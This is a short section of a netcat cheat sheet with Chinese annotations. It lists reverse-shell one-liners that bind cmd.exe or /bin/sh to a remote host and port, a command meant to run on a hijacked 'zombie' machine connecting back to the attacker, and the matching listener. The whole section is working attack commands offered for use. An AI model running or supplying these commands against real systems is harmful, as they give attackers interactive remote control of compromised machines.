## 38. nc
#nc

```sh	
nc -t -e C:\WINDOWS\system32\cmd.exe 8.8.8.8 1234 #windows
./netcat 8.8.8.8 1234 -e /bin/sh #linux
#######
nc -vv yourIP 8080 -e cmd #肉鸡
nc -vv -i -p 8080 #-i监听入站信息，-p本地端口号，-vv显示端口详细信息
```